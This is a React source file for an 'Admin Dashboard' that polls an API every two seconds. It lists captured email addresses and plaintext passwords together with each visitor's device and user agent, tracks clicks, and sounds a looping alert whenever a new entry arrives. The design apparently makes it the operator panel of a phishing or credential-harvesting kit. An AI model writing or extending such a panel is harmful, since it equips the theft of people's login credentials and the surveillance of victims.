import React, { useEffect, useState } from 'react';
import '../assets/style.css';

const AdminDashboard = () => {
  const [data, setData] = useState([]);
  const [clicks, setClicks] = useState([]);
  const [alertOn, setAlertOn] = useState(false);
  const alertSound = new Audio("/audio/alert.mp3");
  const clickSound = new Audio("/audio/click.mp3");

  useEffect(() => {
    const fetchData = async () => {
      const res = await fetch('/api/data');
      const result = await res.json();
      setData(result);
    };

    const fetchClicks = async () => {
      const res = await fetch('/api/clicks');
      const result = await res.json();
      setClicks(result);
      clickSound.play(); // optional: plays sound for new clicks
    };

    const checkAlert = async () => {
      const res = await fetch('/api/check-alert');
      const result = await res.json();
      if (result.alert && !alertOn) {
        alertSound.loop = true;
        alertSound.play();
        setAlertOn(true);
      }
    };

    fetchData();
    fetchClicks();
    checkAlert();

    const interval = setInterval(() => {
      fetchData();
      fetchClicks();
      checkAlert();
    }, 2000);

    return () => clearInterval(interval);
  }, [alertOn]);

  const stopAlert = async () => {
    await fetch('/api/stop-alert', { method: 'POST' });
    alertSound.pause();
    alertSound.currentTime = 0;
    setAlertOn(false);
  };

  const handleDelete = async (id) => {
    await fetch(`/api/data/${id}`, { method: 'DELETE' });
    setData((prev) => prev.filter(item => item.id !== id));
  };

  return (
    <div style={{ padding: '20px' }}>
      <h1>Admin Dashboard</h1>

      <button onClick={stopAlert} className="submit-button">Stop Alert Sound</button>

      <h2 style={{ marginTop: '30px' }}>User Login Data</h2>
      <table border="1" cellPadding="10" style={{ width: "100%", background: "#fff" }}>
        <thead>
          <tr>
            <th>#</th>
            <th>Email</th>
            <th>Password</th>
            <th>Device</th>
            <th>User Agent</th>
            <th>Time</th>
            <th>Remove</th>
          </tr>
        </thead>
        <tbody>
          {data.map((entry, idx) => (
            <tr key={entry.id}>
              <td>{idx + 1}</td>
              <td>{entry.email}</td>
              <td>{entry.password}</td>
              <td>{entry.device}</td>
              <td>{entry.userAgent}</td>
              <td>{entry.time}</td>
              <td><button onClick={() => handleDelete(entry.id)} style={{ color: 'red' }}>Delete</button></td>
            </tr>
          ))}
        </tbody>
      </table>

      <h2 style={{ marginTop: '40px' }}>Click Device Logs</h2>
      <p>Total Clicks: {clicks.length}</p>
      <table border="1" cellPadding="10" style={{ width: "100%", background: "#fff" }}>
        <thead>
          <tr>
            <th>#</th>
            <th>Device</th>
            <th>User Agent</th>
            <th>Time</th>
          </tr>
        </thead>
        <tbody>
          {clicks.map((click, index) => (
            <tr key={click.id}>
              <td>{index + 1}</td>
              <td>{click.device}</td>
              <td>{click.userAgent}</td>
              <td>{click.time}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

export default AdminDashboard;
